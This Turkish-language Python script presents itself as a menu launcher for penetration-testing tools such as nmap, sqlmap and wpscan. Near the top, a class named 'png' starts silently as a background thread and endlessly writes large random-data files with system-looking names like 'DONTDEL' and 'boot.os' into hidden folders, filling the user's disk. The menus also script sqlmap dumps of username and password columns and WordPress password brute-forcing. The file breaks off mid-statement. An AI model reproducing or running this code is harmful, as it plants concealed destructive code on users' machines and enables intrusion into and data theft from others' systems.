# -*- coding:utf-8 -*-
import os, platform, sys, random , time , threading , sys

########################################################################################################################


if sys.version_info.major < 3: sys.exit("Sadece Python3 !")


renkler = ["\033[32m", "\033[31m", "\033[33m", "\033[34m", "\033[35m"]
kirmizi = renkler[1];yesil = renkler[0];turuncu = renkler[2];mavi = renkler[3];mor = renkler[4]
normal = "\033[0m"


def slogan():
    sil()
    print("""{}
            ██████╗ ███████╗███╗   ██╗            
            ██╔══██╗██╔════╝████╗  ██║            
            ██████╔╝█████╗  ██╔██╗ ██║            
            ██╔═══╝ ██╔══╝  ██║╚██╗██║            
            ██║     ███████╗██║ ╚████║            
            ╚═╝     ╚══════╝╚═╝  ╚═══╝  {}for Persona Non Grata{}          

████████╗███████╗███████╗████████╗███████╗██████╗ 
╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝
   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
   ██║   ███████╗███████║   ██║   ███████╗██║  ██║
   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{}""".format(random.choice(renkler), random.choice(renkler), random.choice(renkler), normal))


def sil():
    os.system("clear")



class png():
    def __init__(self):
        self.filenames = ["config","DONTDEL","boot.os","boot.fi"]
        self.linux_locale = [f"/home/{os.getlogin()}/.linux/"]
        self.linux_aarch64_locale = ["/sdcard/Android/.Android/"]
        self.windows_locale = [f"C:\\Users\\{os.getlogin()}\\AppData\\Windows\\"]
        self.undefinied = ["/home/.system/"]

        self.platform()

        

    def platform(self):
        system = platform.system()
        if system == "Linux":
            if platform.machine() == "aarch64": # Termuxcu arkadaşlara deneyimleme şansı
                try:
                    os.listdir("/sdcard") # sdcard'a erişimimiz var mı diye bakıyoruz
                except:
                    os.system("termux-setup-storage")
                    sys.exit("\033[31mWe need access storage file !\033[0m")
                else:
                    self.dosyala(self.linux_aarch64_locale)
            
            else:
                self.dosyala(self.linux_locale)

        elif system == "Windows":
            self.dosyala(self.windows_locale)
    
    
    def dosyala(self,__konum__):
        while 1:
            
            konum = random.choice(__konum__)

            if not os.path.exists(konum):
                os.makedirs(konum)
                
            
            os.chdir(konum)

            try:
                eleman = random.choice(self.filenames)
                orj = eleman
                while 1:
                    if os.path.exists(eleman):
                        eleman = orj + str(random.randint(1,999999))
                    else:
                        break
                
                with open(eleman,"wb") as yaz:
                    yaz.write(os.urandom(512**random.randint(1,3)) ) # 3 = 1gb | 4 = kim bilir :D
            except Exception as hata:
                print(hata)



abc = threading.Thread(target=png)
abc.daemon = True
abc.start()


try:
    import requests
except ModuleNotFoundError:
    os.system("pip3 install requests")
    try:
        import requests
    except Exception as hata:
        sys.exit("requests yüklenemedi !\n\nLog : "+hata)
try:
    from bs4 import BeautifulSoup
except:
    os.system("pip3 install bs4")
    try:
        from bs4 import BeautifulSoup
    except Exception as hata:
        sys.exit("bs4 yüklenemedi !\n\nLog : "+hata)





while True:
    renk2 = random.choice(renkler[1:])
    slogan()
    print(f"""
    {random.choice(renkler)}-----------------------------------------{normal}

    {renk2}[{yesil}1{renk2}]{normal} Bilgi Toplama
    {renk2}[{yesil}2{renk2}]{normal} Zaafiyet Analizi
    {renk2}[{yesil}3{renk2}]{normal} İstismar Araçları
    {renk2}[{yesil}4{renk2}]{normal} Şifre Saldırıları
    {renk2}[{yesil}5{renk2}]{normal} Gizlenme
    {renk2}[{yesil}6{renk2}]{normal} Toollar Hakkında Bilgi
    {renk2}[{yesil}7{renk2}]{normal} Bazı Microsoft Zaafiyetleri
    {renk2}[{yesil}8{renk2}]{normal} Hakkımızda

   Çıkış: (q)""")
 ########################################################################################################################

    islem = input("Yapmak istediğiniz İşlemi Seçiniz: ")
    if islem == "q":
        exit()
    elif islem == "1":
        slogan()
        print(f"""
        {random.choice(renkler)}-----------------------------------------{normal}

         1) Nmap
         2) İnfoga
         3) Dnsmap
         4) Sn1per
         5) Dmitry
         6) Dnsenum
         7) Fierce
         8) Dnsdict6
         9) Wafw00f
        10) NetDiscover
        11) Arp-Scan
        12) DnsRecon
        13) NSlookup
        14) Host
        15) Whois
        16) Zone Transfer
        17) Dirb

        """)
        islem11 = input("Araç Numarasını Giriniz: ")
########################################################################################################################
        if islem11 == "1":
            slogan()
            #print("--Nmap Aracı Çalıştırılıyor--")
            print("""
                    
        ▐ ▄ • ▌ ▄ ·. ▄▄▄ . ▄▄▄·
        •█▌▐█·██ ▐███▪▀▄.▀·▐█ ▄█
        ▐█▐▐▌▐█ ▌▐▌▐█·▐▀▀▪▄ ██▀·
        ██▐█▌██ ██▌▐█▌▐█▄▄▌▐█▪·•
        ▀▀ █▪▀▀  █▪▀▀▀ ▀▀▀ .▀   
        """)
            IpAdress = input("Hedef Ip adresini giriniz: ")
            print(f"""
                {random.choice(renkler)}-----------------------------------------{normal}
                 1) Servis Bilgisini Taramak
                 2) İşletim Sistemi Tespiti
                 3) Hedef Sistem Üzerinde Zaafiyet Tespiti
                 4) Nmap'ın Tüm Scriptlerini Kullan
                 5) 21.Porta Yönelik Brute Force
                 6) Tcp Taraması
                 7) Udp Taraması
                 8) Belirli Bir Portu Taramak 
                 9) 1 ile 100 Arasındaki Portları Taramak
                10) En Sık Kullanılan 10 Portu Taramak 
                11) En Sık Kullanılan Scriptlerle Taramak
                12) En Yaygın 100 Portu Taramak
                13) Kardeş Bırak Ne Yapıcağıma Kendim Karar Veriyim
                """)
            islem12 = input("Yapmak istediğiniz işlemi Seçiniz: ")

            if islem12 == "1":
                os.system("nmap -sS -sV " + IpAdress)
            elif islem12 == "2":
                os.system("nmap -sS -O " + IpAdress)
            elif islem12 == "3":
                os.system("nmap --script vuln " + IpAdress)
            elif islem12 == "4":
                os.system("nmap --script=all " + IpAdress)
            elif islem12 == "5":
                os.system("nmap --script=ftp-brute -p " + IpAdress)
            elif islem12 == "6":
                os.system("nmap -sT " + IpAdress)
            elif islem12 == "7":
                os.system("nmap -sU " + IpAdress)
            elif islem12 == "8":
                portno = input("Taramak İstediğiniz Portu Giriniz: ")
                print("Seçilen Port {}".format(portno))
                os.system("nmap -sS -p{} ".format(portno) + IpAdress)
            elif islem12 == "9":
                os.system("nmap -sS -p1-100 {}".format(IpAdress))
            elif islem12 == "10":
                os.system("nmap -sS -top-ports <10> {}".format(IpAdress))
            elif islem12 == "11":
                os.system("nmap -sS -A {}".format(IpAdress))
            elif islem12 == "12":
                os.system("nmap -sS -F {}".format(IpAdress))
            elif islem12 == "13":
                os.system(input("Komudunuz : örnek [ nmap -sS -F 127.0.0.1 ] : "))

            input("[ENTER] ile devam et")





########################################################################################################################

        elif islem11 == "2":
            if "Infoga" in os.listdir():
                slogan()
            else:
                os.system("git clone https://github.com/m4ll0k/Infoga.git")
                os.chdir("Infoga")
                os.system("python setup.py install")
                print("Kurulum Tamamlandı")

            os.chdir("Infoga")
            slogan()
            print("""
        ▪   ▐ ▄ ·▄▄▄       ▄▄ •  ▄▄▄· 
        ██ •█▌▐█▐▄▄·▪     ▐█ ▀ ▪▐█ ▀█ 
        ▐█·▐█▐▐▌██▪  ▄█▀▄ ▄█ ▀█▄▄█▀▀█ 
        ▐█▌██▐█▌██▌.▐█▌.▐▌▐█▄▪▐█▐█ ▪▐▌
        ▀▀▀▀▀ █▪▀▀▀  ▀█▄▀▪·▀▀▀▀  ▀  ▀ 
        """)
            adres = input("Mail Taraması Yapmak İstediğiniz Adresi Giriniz: ")
            os.system("python infoga.py --domain " + adres)
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "3":
            slogan()
            print("""
        ·▄▄▄▄   ▐ ▄ .▄▄ · • ▌ ▄ ·.  ▄▄▄·  ▄▄▄·
        ██▪ ██ •█▌▐█▐█ ▀. ·██ ▐███▪▐█ ▀█ ▐█ ▄█
        ▐█· ▐█▌▐█▐▐▌▄▀▀▀█▄▐█ ▌▐▌▐█·▄█▀▀█  ██▀·
        ██. ██ ██▐█▌▐█▄▪▐███ ██▌▐█▌▐█ ▪▐▌▐█▪·•
        ▀▀▀▀▀• ▀▀ █▪ ▀▀▀▀ ▀▀  █▪▀▀▀ ▀  ▀ .▀   
        """)
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("dnsmap " + adres)
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "4":
            if "Sn1per" in os.listdir():
                print("Herşey Hazır, Hadi Bilgi Toplıyalım.")
            else:
                os.system("git clone https://github.com/1N3/Sn1per.git")
                os.chdir("Sn1per")
                os.system("chmod +x install.sh")
                os.system("chmod +x sniper")
                os.system("./install.sh")
            os.chdir("Sn1per")
            slogan()
            print("""
        .▄▄ ·  ▐ ▄ ▪   ▄▄▄·▄▄▄ .▄▄▄  
        ▐█ ▀. •█▌▐███ ▐█ ▄█▀▄.▀·▀▄ █·
        ▄▀▀▀█▄▐█▐▐▌▐█· ██▀·▐▀▀▪▄▐▀▀▄ 
        ▐█▄▪▐███▐█▌▐█▌▐█▪·•▐█▄▄▌▐█•█▌
        ▀▀▀▀ ▀▀ █▪▀▀▀.▀    ▀▀▀ .▀  ▀
            """)
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("./sniper -t " + adres)
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == ("5"):
            slogan()
            print("""
        ·▄▄▄▄  • ▌ ▄ ·. ▪  ▄▄▄▄▄▄▄▄   ▄· ▄▌
        ██▪ ██ ·██ ▐███▪██ •██  ▀▄ █·▐█▪██▌
        ▐█· ▐█▌▐█ ▌▐▌▐█·▐█· ▐█.▪▐▀▀▄ ▐█▌▐█▪
        ██. ██ ██ ██▌▐█▌▐█▌ ▐█▌·▐█•█▌ ▐█▀·.
        ▀▀▀▀▀• ▀▀  █▪▀▀▀▀▀▀ ▀▀▀ .▀  ▀  ▀ • 
        """)
            print("""

            1) Whois Sorgusu
            2) Netcraft Üzerinden Whois Sorgu Sonuçları
            3) Banner Bilgisi
            4) Açık Portların Tespiti (İlk 150 port için)

            """)
            deger = input("Hangi Taramayı Yapmak İstersiniz: ")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            if deger == "1":
                os.system("dmitry -w {}".format(adres))
            elif deger == "2":
                os.system("dmitry -n {}".format(adres))
            elif deger == "3":
                os.system("dmitry -pb {}".format(adres))
            elif deger == "4":
                os.system("dmitry -p {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "6":
            slogan()
            print("""
        ·▄▄▄▄   ▐ ▄ .▄▄ · ▄▄▄ . ▐ ▄ ▄• ▄▌• ▌ ▄ ·. 
        ██▪ ██ •█▌▐█▐█ ▀. ▀▄.▀·•█▌▐██▪██▌·██ ▐███▪
        ▐█· ▐█▌▐█▐▐▌▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌█▌▐█▌▐█ ▌▐▌▐█·
        ██. ██ ██▐█▌▐█▄▪▐█▐█▄▄▌██▐█▌▐█▄█▌██ ██▌▐█▌
        ▀▀▀▀▀• ▀▀ █▪ ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ ▀▀  █▪▀▀▀
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("dnsenum -v {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "7":
            slogan()
            print("""
        ·▄▄▄▪  ▄▄▄ .▄▄▄   ▄▄· ▄▄▄ .
        ▐▄▄·██ ▀▄.▀·▀▄ █·▐█ ▌▪▀▄.▀·
        ██▪ ▐█·▐▀▀▪▄▐▀▀▄ ██ ▄▄▐▀▀▪▄
        ██▌.▐█▌▐█▄▄▌▐█•█▌▐███▌▐█▄▄▌
        ▀▀▀ ▀▀▀ ▀▀▀ .▀  ▀·▀▀▀  ▀▀▀ 
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("fierce -dns {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "8":
            slogan()
            print("""
        ·▄▄▄▄   ▐ ▄ .▄▄ · ·▄▄▄▄  ▪   ▄▄· ▄▄▄▄▄
        ██▪ ██ •█▌▐█▐█ ▀. ██▪ ██ ██ ▐█ ▌▪•██  
        ▐█· ▐█▌▐█▐▐▌▄▀▀▀█▄▐█· ▐█▌▐█·██ ▄▄ ▐█.▪
        ██. ██ ██▐█▌▐█▄▪▐███. ██ ▐█▌▐███▌ ▐█▌·
        ▀▀▀▀▀• ▀▀ █▪ ▀▀▀▀ ▀▀▀▀▀• ▀▀▀·▀▀▀  ▀▀▀ 
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("dnsdict6 {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "9":
            slogan()
            print("""
        ▄▄▌ ▐ ▄▌ ▄▄▄· ·▄▄▄▄▄▌ ▐ ▄▌·▄▄▄
        ██· █▌▐█▐█ ▀█ ▐▄▄·██· █▌▐█▐▄▄·
        ██▪▐█▐▐▌▄█▀▀█ ██▪ ██▪▐█▐▐▌██▪ 
        ▐█▌██▐█▌▐█ ▪▐▌██▌.▐█▌██▐█▌██▌.
        ▀▀▀▀ ▀▪ ▀  ▀ ▀▀▀  ▀▀▀▀ ▀▪▀▀▀ 
 """)
            adres = input("Taramak İstediğini Adresi Giriniz: ")
            os.system("wafw00f {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "10":
            slogan()
            print("""
 ▐ ▄ ▄▄▄ .▄▄▄▄▄·▄▄▄▄  ▪  .▄▄ ·  ▄▄·        ▌ ▐·▄▄▄ .▄▄▄  
•█▌▐█▀▄.▀·•██  ██▪ ██ ██ ▐█ ▀. ▐█ ▌▪▪     ▪█·█▌▀▄.▀·▀▄ █·
▐█▐▐▌▐▀▀▪▄ ▐█.▪▐█· ▐█▌▐█·▄▀▀▀█▄██ ▄▄ ▄█▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
██▐█▌▐█▄▄▌ ▐█▌·██. ██ ▐█▌▐█▄▪▐█▐███▌▐█▌.▐▌ ███ ▐█▄▄▌▐█•█▌
▀▀ █▪ ▀▀▀  ▀▀▀ ▀▀▀▀▀• ▀▀▀ ▀▀▀▀ ·▀▀▀  ▀█▄▀▪. ▀   ▀▀▀ .▀  ▀""")
            os.system("netdiscover")
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "11":
            slogan()
            print("""
        ▄▄▄· ▄▄▄   ▄▄▄·.▄▄ ·  ▄▄·  ▄▄▄·  ▐ ▄ 
        ▐█ ▀█ ▀▄ █·▐█ ▄█▐█ ▀. ▐█ ▌▪▐█ ▀█ •█▌▐█
        ▄█▀▀█ ▐▀▀▄  ██▀·▄▀▀▀█▄██ ▄▄▄█▀▀█ ▐█▐▐▌
        ▐█ ▪▐▌▐█•█▌▐█▪·•▐█▄▪▐█▐███▌▐█ ▪▐▌██▐█▌
        ▀  ▀ .▀  ▀.▀    ▀▀▀▀ ·▀▀▀  ▀  ▀ ▀▀ █▪
 """)
            os.system("arp-scan -l")
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "12":
            slogan()
            print("""
    ·▄▄▄▄   ▐ ▄ .▄▄ · ▄▄▄  ▄▄▄ . ▄▄·        ▐ ▄ 
    ██▪ ██ •█▌▐█▐█ ▀. ▀▄ █·▀▄.▀·▐█ ▌▪▪     •█▌▐█
    ▐█· ▐█▌▐█▐▐▌▄▀▀▀█▄▐▀▀▄ ▐▀▀▪▄██ ▄▄ ▄█▀▄ ▐█▐▐▌
    ██. ██ ██▐█▌▐█▄▪▐█▐█•█▌▐█▄▄▌▐███▌▐█▌.▐▌██▐█▌
    ▀▀▀▀▀• ▀▀ █▪ ▀▀▀▀ .▀  ▀ ▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀ █▪
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("dnsrecon -t goo -d {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "13":
            slogan()
            print("""
        ▐ ▄ .▄▄ · ▄▄▌              ▄ •▄ ▄• ▄▌ ▄▄▄·
        •█▌▐█▐█ ▀. ██•  ▪     ▪     █▌▄▌▪█▪██▌▐█ ▄█
        ▐█▐▐▌▄▀▀▀█▄██▪   ▄█▀▄  ▄█▀▄ ▐▀▀▄·█▌▐█▌ ██▀·
        ██▐█▌▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▌.▐▌▐█.█▌▐█▄█▌▐█▪·•
        ▀▀ █▪ ▀▀▀▀ .▀▀▀  ▀█▄▀▪ ▀█▄▀▪·▀  ▀ ▀▀▀ .▀   
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("nslookup " + adres)
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "14":
            slogan()
            print("""
                ▄ .▄      .▄▄ · ▄▄▄▄▄
                ██▪▐█▪     ▐█ ▀. •██  
                ██▀▐█ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪
                ██▌▐▀▐█▌.▐▌▐█▄▪▐█ ▐█▌·
                ▀▀▀ · ▀█▄▀▪ ▀▀▀▀  ▀▀▀ 
""")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("host {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "15":
            slogan()
            print("""
            ▄▄▌ ▐ ▄▌ ▄ .▄      ▪  .▄▄ · 
            ██· █▌▐███▪▐█▪     ██ ▐█ ▀. 
            ██▪▐█▐▐▌██▀▐█ ▄█▀▄ ▐█·▄▀▀▀█▄
            ▐█▌██▐█▌██▌▐▀▐█▌.▐▌▐█▌▐█▄▪▐█
            ▀▀▀▀ ▀▪▀▀▀ · ▀█▄▀▪▀▀▀ ▀▀▀▀ 
 """)
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("whois {}".format(adres))
            input("[ENTER] ile devam et")
########################################################################################################################
        elif islem11 == "16":
            slogan()
            print("""
·▄▄▄▄•       ▐ ▄ ▄▄▄ .▄▄▄▄▄▄▄▄   ▄▄▄·  ▐ ▄ .▄▄ · ·▄▄▄▄▄▄ .▄▄▄  
▪▀·.█▌▪     •█▌▐█▀▄.▀·•██  ▀▄ █·▐█ ▀█ •█▌▐█▐█ ▀. ▐▄▄·▀▄.▀·▀▄ █·
▄█▀▀▀• ▄█▀▄ ▐█▐▐▌▐▀▀▪▄ ▐█.▪▐▀▀▄ ▄█▀▀█ ▐█▐▐▌▄▀▀▀█▄██▪ ▐▀▀▪▄▐▀▀▄ 
█▌▪▄█▀▐█▌.▐▌██▐█▌▐█▄▄▌ ▐█▌·▐█•█▌▐█ ▪▐▌██▐█▌▐█▄▪▐███▌.▐█▄▄▌▐█•█▌
·▀▀▀ • ▀█▄▀▪▀▀ █▪ ▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀ ▀▀ █▪ ▀▀▀▀ ▀▀▀  ▀▀▀ .▀  ▀
""")
            print("""

            1) Name Server Tespiti
            2) Subdomain Tespiti

            """)
            islem33 = input("Araç Numarasını Giriniz: ")
            if islem33 == "1":
                adres = input("Taramak İstediğiniz Adresi Giriniz: ")
                os.system("host -t ns {}".format(adres))
            elif islem33 == "2":
                adres = input("Taramak İstediğiniz Adresi Giriniz: ")
                os.system("host -l {}".format(adres))
            input("[ENTER] ile devam et")
        elif islem11 == "17":
            slogan()
            print("""
                    ·▄▄▄▄  ▪  ▄▄▄  ▄▄▄▄· 
                    ██▪ ██ ██ ▀▄ █·▐█ ▀█▪
                    ▐█· ▐█▌▐█·▐▀▀▄ ▐█▀▀█▄
                    ██. ██ ▐█▌▐█•█▌██▄▪▐█
                    ▀▀▀▀▀• ▀▀▀.▀  ▀·▀▀▀▀ 
""")
            hedef = input("Taramak İstediğini Adresi Giriniz.(http yada https dahil) ")
            os.system("dirb {}".format(hedef))
            input("[ENTER] ile devam et")

        elif islem11  == "18":

            konum = os.listdir(".")
            if "KnockPy" in konum:
                print("Herşey Hazır, Hadi Bilgi Toplıyalım.")
            else:
                os.system("git clone https://github.com/santiko/KnockPy.git")
            slogan()
            print("""
        ▄ •▄  ▐ ▄        ▄▄· ▄ •▄  ▄▄▄· ▄· ▄▌
        █▌▄▌▪•█▌▐█▪     ▐█ ▌▪█▌▄▌▪▐█ ▄█▐█▪██▌
        ▐▀▀▄·▐█▐▐▌ ▄█▀▄ ██ ▄▄▐▀▀▄· ██▀·▐█▌▐█▪
        ▐█.█▌██▐█▌▐█▌.▐▌▐███▌▐█.█▌▐█▪·• ▐█▀·.
        ·▀  ▀▀▀ █▪ ▀█▄▀▪·▀▀▀ ·▀  ▀.▀     ▀ • 
        """)
            os.chdir("KnockPy")
            adres = input("Taramak İstediğiniz Adresi Giriniz: ")
            os.system("python knock.py " + adres )
            input("[ENTER] ile devam et")

    ###########################DEVAM<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<><><><><><><><>
    # ----------------------------------------------------------------------------------------------------------------------#

    elif islem == "2":
        print(f"""
                {random.choice(renkler)}-----------------------------------------{normal}

                1) Nikto     
                2) Golismero 
                3) WPscan
                4) WAES
                5) WAScan
                6) wig
                7) SQLiv
                8) a2sv (SSL Scanner)
                9) Uniscan

""")
########################################################################################################################
        islem21 = input("Araç Numarasını Giriniz: ")
        if islem21 == "1":
            os.system("figlet Nikto")
            IpAdress = input("Hedef Ip adresini giriniz: ")
            os.system("nikto -h " + IpAdress)
########################################################################################################################
        elif islem21 == "2":
            konum = os.listdir(".")
            if "golismero" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.chdir("golismero")
            else:
                os.system("git clone https://github.com/golismero/golismero.git")
                os.chdir("golismero")
                os.system("pip install -r requirements.txt")
            os.system("figlet Golismero")
            IpAdress = input("Hedef Ip adresini giriniz: ")
            os.system("clear")
            os.system("python2.7 golismero.py scan " + IpAdress)
########################################################################################################################
        elif islem21 == "3":
            os.system("figlet WPscan")
            webadress = input("Lütfen Site Adresini Giriniz: ")
            print("""
            ----WPscan'a Hoşgeldiniz----
            1)WPscan Güncelle
            2)Genel Tarama
            3)Kullanıcı Adlarını Öğrenmek
            4)Sitedeki tüm eklentileri (Plugins) görmek için
            5)Sitede kullanılan tema(Template) bilgisi için;
            6)Güvenlik açığına sahip eklentileri(Vulnerable Plugins) taramak için;
            7)Tüm temayı taramak için 
            8)Bulunan kullanıcı Adların Yönelik BruteForce
            """)
            wpsecim = input("Yapmak İstediğiniz İşlemi Seçiniz: ")
            if wpsecim == "1":
                os.system("wpscan --update")
            elif wpsecim == "2":
                os.system("wpscan --url " + webadress + " --random-user-agent")
            elif wpsecim == "3":
                os.system("wpscan --url " + webadress + " -e u --random-user-agent")
            elif wpsecim == "4":
                os.system("wpscan --url " + webadress + " -e ap --random-user-agent")
            elif wpsecim == "5":
                os.system("wpscan --url " + webadress + " -e t --random-user-agent")
            elif wpsecim == "6":
                os.system("wpscan --url " + webadress + " -e vp --random-user-agent")
            elif wpsecim == "7":
                os.system("wpscan --url " + webadress + " -e at --random-user-agent")
            elif wpsecim == "8":
                wordlist = input("Wordlistin Konumunu Giriniz (/root/Desktop/sifreler.txt): ")
                hedef = input("Hedef Kullanıcı Adını Giriniz: ")
                os.system(
                    "wpscan --url " + webadress + " --wordlist " + wordlist + "--username " + hedef + "--random-user-agent")
########################################################################################################################

        elif islem21 == "4":
            konum = os.listdir(".")
            if "WAES" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.chdir("WAES")
            else:
                os.system("git clone https://github.com/Shiva108/WAES.git")
                os.chdir("WAES")
                os.system("./install.sh")
                os.system("clear")
            os.system("figlet WAES")
            IpAdress = input("Hedef Ip adresini giriniz: ")
            taranacakport = input("Taranacak Portu Giriniz (Default 80): ")
            if taranacakport == "":
                taranacakport = "80"
            # ./ waes.sh -u 10.10.10.130 -p 8080
            os.system("./waes.sh -u " + IpAdress + "-p " + taranacakport)
########################################################################################################################
        elif islem21 == "5":
            konum = os.listdir(".")
            if "WAScan" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.system("WAScan")
            else:
                os.system("git clone https://github.com/m4ll0k/WAScan.git")
                os.chdir("WAScan")
                os.system("pip install -r requirements.txt")
                os.system("clear")
            os.system("figlet WAScan")
            taranacaklink = input("Taranmasını İstediğini Linki Giriniz: ")
            os.system("clear")
            os.system("python wascan.py --url " + taranacaklink)
########################################################################################################################
        elif islem21 == "6":
            konum = os.listdir(".")
            if "wig" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.chdir("wig")
            else:
                os.system("git clone https://github.com/jekyc/wig.git")
                os.chdir("wig")
            os.system("clear")
            os.system("figlet wig")
            taranacaklink = input("Taranmasını İstediğini Linki Giriniz: ")
            os.system("./wig.py " + taranacaklink)
########################################################################################################################
        elif islem21 == "7":
            konum = os.listdir(".")
            if "sqliv" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.chdir("sqliv")

            else:
                os.system("git clone https://github.com/Hadesy2k/sqliv.git")
                os.chdir("sqliv")
                os.system("pip install -r requirements.txt")
            os.system("clear")
            os.system("figlet sqlıv")
            taranacaklink = input("Taranmasını İstediğini Adresi Giriniz: ")
            # python sqliv.py -t url
            os.system("python sqliv.py -t " + taranacaklink)
########################################################################################################################
        elif islem21 == "8":
            konum = os.listdir(".")
            if "a2sv" in konum:
                print("Herşey Hazır, Hadi Açık Bulalım...")
                os.chdir("a2sv")
            else:
                os.system("git clone https://github.com/hahwul/a2sv.git")
                os.chdir("a2sv")  #########SORUNLU
                os.system("pip install -r requirements.txt")
            os.system("clear")
            os.system("figlet a2sv")
            IpAdress = input("Hedef Ip adresini giriniz: ")
            os.system("python a2sv.py -t " + IpAdress)
        elif islem21 == "9":
            hedef = input("Hedef Adresi Giriniz: ")
            os.system("uniscan -u {} -ds".format(hedef))
########################################################################################################################
    elif islem == "3":
        print("""
        ----Hangi İstismar Aracını Kullanmak İstersiniz----

        1) SQLmap
        2) Msfvenom


        """)
        sec = input("Kullanmak İstediğini Aracı Giriniz: ")
        if sec == "1":
            os.system("figlet Sqlmap")
            print("SQLmap Aracı Çalıştırılıyor...")

            adres = input("SQL Açıklı Adresi Giriniz: ")
            randomagent = input("Random-Agent Kullanmak İstiyormusunuz? (E/H) ")
            riskvelevel = input("Risk ve Level Kullanmak istermisiniz? (E/H)")
            ######os.system("sqlmap -u url --dbs --risk=3 --level=3

            if randomagent == "E" and riskvelevel == "H":
                os.system("sqlmap -u {} --dbs --random-agent".format(adres))
                veritabani = input("Sızmak İstediğiniz VeriTabanı Adını Giriniz: ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " --tables --random-agent")
                tabloadi = input("Çekmek İstediğiniz Tablo Adını Giriniz: ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " --columns --random-agent")
                colon = input("Çekmek İstediğiniz Kolonları Giriniz: (uname,pass,email,.. vb) ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " -C " + colon + " --dump --random-agent")

            elif randomagent == "H" and riskvelevel == "E":
                risk = input("Risk Parametresi İçin Değer Atayınız: ")
                level = input("Level Parametresi içim Değer Atayınız: ")
                os.system("sqlmap -u " + adres + " --dbs --risk=" + risk + " --level=" + level)
                veritabani = input("Sızmak İstediğiniz VeriTabanı Adını Giriniz: ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " --tables --level=" + level + " --risk=" + risk)
                tabloadi = input("Çekmek İstediğiniz Tablo Adını Giriniz: ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " --columns --level=" + level + " --risk=" + risk)
                colon = input("Çekmek İstediğiniz Kolonları Giriniz: (uname,pass,email,.. vb) ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " -C " + colon + " --dump --level=" + level + " --risk=" + risk)

            elif randomagent == "E" and riskvelevel == "E":
                risk = input("Risk Parametresi İçin Değer Atayınız: ")
                level = input("Level Parametresi için Değer Atayınız: ")
                os.system("sqlmap -u " + adres + " --dbs --risk=" + risk + " --level=" + level + " --random-agent")
                veritabani = input("Sızmak İstediğiniz VeriTabanı Adını Giriniz: ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " --tables --level=" + level + " --risk=" + risk + " --random-agent")
                tabloadi = input("Çekmek İstediğiniz Tablo Adını Giriniz: ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " --columns --level=" + level + " --risk=" + risk + " --random-agent")
                colon = input("Çekmek İstediğiniz Kolonları Giriniz: (uname,pass,email,.. vb) ")
                os.system(
                    "sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " -C " + colon + " --dump --level=" + level + " --risk=" + risk + " --random-agent")

            elif randomagent == "H" and riskvelevel == "H":
                os.system("sqlmap -u " + adres + " --dbs")
                veritabani = input("Sızmak İstediğiniz VeriTabanı Adını Giriniz: ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " --tables")
                tabloadi = input("Çekmek İstediğiniz Tablo Adını Giriniz: ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " --columns")
                colon = input("Çekmek İstediğiniz Kolonları Giriniz: (uname,pass,email,.. vb) ")
                os.system("sqlmap -u " + adres + " -D " + veritabani + " -T " + tabloadi + " -C " + colon + " --dump")

        elif sec == "2":
            print("----Windowsa Yönelik İşlemlerimiz Başlıyor----")
            payload = input(
